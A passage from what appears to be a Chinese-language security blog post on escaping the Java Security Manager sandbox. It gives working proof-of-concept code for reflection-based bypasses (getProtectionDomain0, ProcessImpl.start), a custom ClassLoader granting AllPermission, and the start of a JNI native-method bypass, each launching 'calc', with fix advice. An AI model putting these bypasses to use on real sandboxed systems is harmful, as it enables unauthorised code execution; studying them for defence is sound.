</span>&#123;</span><br><span class="line">    SecurityManager sm = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="keyword">null</span>) &#123;</span><br><span class="line">        sm.checkPermission(SecurityConstants.GET_PD_PERMISSION);</span><br><span class="line">    &#125;</span><br><span class="line">    java.security.ProtectionDomain pd = getProtectionDomain0();</span><br><span class="line">    <span class="keyword">if</span> (pd == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (allPermDomain == <span class="keyword">null</span>) &#123;</span><br><span class="line">            java.security.Permissions perms =</span><br><span class="line">                <span class="keyword">new</span> java.security.Permissions();</span><br><span class="line">            perms.add(SecurityConstants.ALL_PERMISSION);</span><br><span class="line">            allPermDomain =</span><br><span class="line">                <span class="keyword">new</span> java.security.ProtectionDomain(<span class="keyword">null</span>, perms);</span><br><span class="line">        &#125;</span><br><span class="line">        pd = allPermDomain;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们完全可以通过反射直接运行getProtectionDomain0()方法，从而绕过对getProtectionDomain()方法的过滤，进而直接Bypass安全管理器。</p><h4 id="Bypass利用——getProtectionDomain0"><a href="#Bypass利用——getProtectionDomain0" class="headerlink" title="Bypass利用——getProtectionDomain0"></a>Bypass利用——getProtectionDomain0</h4><p>BypassSandbox类的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Running setHasAllPerm0()"</span>);</span><br><span class="line">        setHasAllPerm0(<span class="string">"calc"</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setHasAllPerm0</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();</span><br><span class="line">        <span class="comment">//遍历栈帧</span></span><br><span class="line">        <span class="keyword">for</span> (StackTraceElement stackTraceElement : stackTraceElements) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class clz = Class.forName(stackTraceElement.getClassName());</span><br><span class="line">                <span class="comment">//利用反射调用getProtectionDomain0方法</span></span><br><span class="line">                Method getProtectionDomain = clz.getClass().getDeclaredMethod(<span class="string">"getProtectionDomain0"</span>, <span class="keyword">null</span>);</span><br><span class="line">                getProtectionDomain.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ProtectionDomain pd = (ProtectionDomain) getProtectionDomain.invoke(clz);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (pd != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    Field field = pd.getClass().getDeclaredField(<span class="string">"hasAllPerm"</span>);</span><br><span class="line">                    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    field.set(pd, <span class="keyword">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Runtime.getRuntime().exec(command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可绕过getProtectionDomain()方法的过滤和安全管理器的限制执行命令弹计算器：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/18.png" alt=""></p><h4 id="Bypass利用——ProcessImpl"><a href="#Bypass利用——ProcessImpl" class="headerlink" title="Bypass利用——ProcessImpl"></a>Bypass利用——ProcessImpl</h4><p>有些方法的实现是，在public方法里面调用Security Manager检查权限，然后调用一个protect或者private方法实现功能。这样，攻击者可以直接反射实现功能的方法，绕过Security Manager的检查。例如平时我们调用<code>Runtime.getRuntime().exec(command)</code>，其实际的代码实现如下，是调用的ProcessBuilder.start()实现的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String[] cmdarray, String[] envp, File dir)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ProcessBuilder(cmdarray)</span><br><span class="line">        .environment(envp)</span><br><span class="line">        .directory(dir)</span><br><span class="line">        .start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点进ProcessBuilder.start()函数中看其实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// Must convert to array first -- a malicious user-supplied</span></span><br><span class="line">    <span class="comment">// list might try to circumvent the security check.</span></span><br><span class="line">    String[] cmdarray = command.toArray(<span class="keyword">new</span> String[command.size()]);</span><br><span class="line">    cmdarray = cmdarray.clone();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (String arg : cmdarray)</span><br><span class="line">        <span class="keyword">if</span> (arg == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    <span class="comment">// Throws IndexOutOfBoundsException if command is empty</span></span><br><span class="line">    String prog = cmdarray[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    SecurityManager security = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (security != <span class="keyword">null</span>)</span><br><span class="line">        security.checkExec(prog);</span><br><span class="line"></span><br><span class="line">    String dir = directory == <span class="keyword">null</span> ? <span class="keyword">null</span> : directory.toString();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; cmdarray.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cmdarray[i].indexOf(<span class="string">'\u0000'</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"invalid null character in command"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ProcessImpl.start(cmdarray,</span><br><span class="line">                                 environment,</span><br><span class="line">                                 dir,</span><br><span class="line">                                 redirects,</span><br><span class="line">                                 redirectErrorStream);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException | IllegalArgumentException e) &#123;</span><br><span class="line">        String exceptionInfo = <span class="string">": "</span> + e.getMessage();</span><br><span class="line">        Throwable cause = e;</span><br><span class="line">        <span class="keyword">if</span> ((e <span class="keyword">instanceof</span> IOException) &amp;&amp; security != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// Can not disclose the fail reason for read-protected files.</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                security.checkRead(prog);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">                exceptionInfo = <span class="string">""</span>;</span><br><span class="line">                cause = se;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// It's much easier for us to create a high-quality error</span></span><br><span class="line">        <span class="comment">// message than the low-level C code which found the problem.</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(</span><br><span class="line">            <span class="string">"Cannot run program \""</span> + prog + <span class="string">"\""</span></span><br><span class="line">            + (dir == <span class="keyword">null</span> ? <span class="string">""</span> : <span class="string">" (in directory \""</span> + dir + <span class="string">"\")"</span>)</span><br><span class="line">            + exceptionInfo,</span><br><span class="line">            cause);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，显示检查了是否有执行命令的权限，然后实际是调用了ProcessImpl.start()方法来实现命令执行。也就是说，完成功能的是ProcessImpl.start()方法，而在这个方法调用之前，Java Security Manager就已经完成了检测。因此，当我们直接反射调用这个方法时，就能成功绕过Java Security Manager的检测过滤。</p><p>BypassSandbox类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Running reflectProcessImpl()"</span>);</span><br><span class="line">        reflectProcessImpl(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reflectProcessImpl</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class clz = Class.forName(<span class="string">"java.lang.ProcessImpl"</span>);</span><br><span class="line">        Method method = clz.getDeclaredMethod(<span class="string">"start"</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="keyword">boolean</span>.class);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        method.invoke(clz, <span class="keyword">new</span> String[]&#123;command&#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可绕过安全管理器的限制执行命令弹计算器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager -Djava.security.policy=&quot;E:\\my.policy&quot; BypassSandbox</span><br></pre></td></tr></table></figure><p><img src="/2020/05/03/浅析Java沙箱逃逸/9.png" alt=""></p><h4 id="修复方法-2"><a href="#修复方法-2" class="headerlink" title="修复方法"></a>修复方法</h4><p>不授予accessDeclaredMembers权限和suppressAccessChecks权限。</p><p>然而在Java中，反射是一个非常常见的操作，如果由于业务需要，无法禁用反射，但可以设置禁止反射的方法和变量的黑名单。比如前面调试分析的在sun.reflect.Reflection中定义了静态的methodFilterMap和fieldMethodMap，在这里面的方法和变量禁止反射。sun.reflect.Reflection还提供了几个方法，可以往methodFilterMap和fieldMethodMap中添加自定义的黑名单。代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">registerFieldsToFilter</span><span class="params">(Class&lt;?&gt; var0, String... var1)</span> </span>&#123;</span><br><span class="line">    fieldFilterMap = registerFilter(fieldFilterMap, var0, var1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">registerMethodsToFilter</span><span class="params">(Class&lt;?&gt; var0, String... var1)</span> </span>&#123;</span><br><span class="line">    methodFilterMap = registerFilter(methodFilterMap, var0, var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，只需要在加载恶意代码之前，把禁止反射的黑名单加入这两个Map即可。</p><h3 id="创建ClassLoader绕过"><a href="#创建ClassLoader绕过" class="headerlink" title="创建ClassLoader绕过"></a>创建ClassLoader绕过</h3><h4 id="Bypass利用-2"><a href="#Bypass利用-2" class="headerlink" title="Bypass利用"></a>Bypass利用</h4><p>一个类的ProtectionDomain在这个类被ClassLoader加载时初始化。</p><p>如果我们能自定义一个ClassLoader来加载一个恶意类，并且把它的ProtectionDomain里面的权限初始化成所有权限，这样就能绕过Java Security Manager了。然而，当这个恶意类被调用时，它仅仅是栈中的一个栈帧，在它下面的栈帧对应的权限仍是policy文件指定的权限。</p><p>这个时候就是doPrivileged()发挥作用的时候了。AccessController会自顶向下遍历栈帧，如果遍历到doPrivileged，它会检查到调用doPrivileged()方法的栈帧为止。只要我们在恶意类中调用doPrivileged()方法，AccessController只会向下遍历检查到恶意类所在的栈帧，而恶意类对应的权限是所有权限，这样就可以绕过Java Security Manager了。</p><p>假设开发者自定义的策略文件my.policy，设置了createClassLoader权限和任意文件读取权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant&#123;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;createClassLoader&quot;;</span><br><span class="line">    permission java.io.FilePermission &quot;&lt;&lt;ALL FILES&gt;&gt;&quot;, &quot;read&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Exploit类，静态代码中调用AccessController.doPrivileged()函数，其中执行恶意命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.security.AccessController;</span><br><span class="line"><span class="keyword">import</span> java.security.PrivilegedAction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Process process = Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var2) &#123;</span><br><span class="line">                    var2.printStackTrace();</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassLoader类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.Channels;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.FileChannel;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.WritableByteChannel;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.security.cert.Certificate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyClassLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyClassLoader</span><span class="params">(ClassLoader parent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        File file = getClassFile(name);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = getClassBytes(file);</span><br><span class="line">            <span class="comment">//在这里调用defineClazz，而不是super.defineClass</span></span><br><span class="line">            Class&lt;?&gt; c = defineClazz(name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClazz(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len) <span class="keyword">throws</span> ClassFormatError &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PermissionCollection pc = <span class="keyword">new</span> Permissions();</span><br><span class="line">            pc.add(<span class="keyword">new</span> AllPermission());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置ProtectionDomain</span></span><br><span class="line">            ProtectionDomain pd = <span class="keyword">new</span> ProtectionDomain(<span class="keyword">new</span> CodeSource(<span class="keyword">null</span>, (Certificate[]) <span class="keyword">null</span>),</span><br><span class="line">                    pc, <span class="keyword">this</span>, <span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.defineClass(name, b, off, len, pd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> File <span class="title">getClassFile</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"./"</span> + name + <span class="string">".class"</span>);</span><br><span class="line">        <span class="keyword">return</span> file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] getClassBytes(File file) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        FileChannel fc = fis.getChannel();</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        WritableByteChannel wbc = Channels.newChannel(baos);</span><br><span class="line">        ByteBuffer by = ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> i = fc.read(by);</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span> || i == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            by.flip();</span><br><span class="line">            wbc.write(by);</span><br><span class="line">            by.clear();</span><br><span class="line">        &#125;</span><br><span class="line">        fis.close();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BypassSandbox类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        MyClassLoader mcl = <span class="keyword">new</span> MyClassLoader();</span><br><span class="line">        Class&lt;?&gt; c1 = Class.forName(<span class="string">"Exploit"</span>, <span class="keyword">true</span>, mcl);</span><br><span class="line">        Object obj = c1.newInstance();</span><br><span class="line">        System.out.println(obj.getClass().getClassLoader());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时尝试运行会发现报错：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager -Djava.security.policy="E:\\my.policy" BypassSandbox</span><br></pre></td></tr></table></figure><p><img src="/2020/05/03/浅析Java沙箱逃逸/20.png" alt=""></p><p>具体执行失败的原因可以参考threedr3am大佬的解释：<a href="https://github.com/codeplutos/java-security-manager-bypass/issues/2" target="_blank" rel="noopener">自定义ClassLoader绕过poc为什么很多人执行出现问题的缘由 #2</a></p><p>一个简单的解决办法就是，在自定义的ClassLoader中重写loadClass()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span> (name.contains(<span class="string">"Exploit"</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.loadClass(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再试一下就OK了：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/19.png" alt=""></p><h4 id="修复方法-3"><a href="#修复方法-3" class="headerlink" title="修复方法"></a>修复方法</h4><p>禁止createClassLoader权限。</p><h3 id="调用本地方法绕过"><a href="#调用本地方法绕过" class="headerlink" title="调用本地方法绕过"></a>调用本地方法绕过</h3><h4 id="Bypass利用-3"><a href="#Bypass利用-3" class="headerlink" title="Bypass利用"></a>Bypass利用</h4><p>Java Security Manager是在Java核心库中的一个功能，而Java中native方法是由JVM执行的，不受Java Security Manager管控。因此，我们可以调用Java native方法，绕过Java Security Manager。</p><p>my.policy，允许loadLibrary以及根目录下任意文件读权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant&#123;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;loadLibrary.*&quot;;</span><br><span class="line">    permission java.io.FilePermission &quot;/root/-&quot;, &quot;read&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>EvilMethodClass类，声明一个native方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilMethodClass</span> </span>&#123;</span><br><span class="line">    <span class="comment">//加载动态链接库</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.load(<span class="string">"/root/libEvilMethodClass.so"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//声明一个native方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">evilMethod</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成.h头：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac src/com/evil/EvilMethodClass.java -d ./bin</span><br><span class="line">javah -jni -classpath ./bin -d ./jni com.evil.EvilMethodClass</span><br><span class="line">javah -jni -classpath ./bin -o EvilMethodClass.h 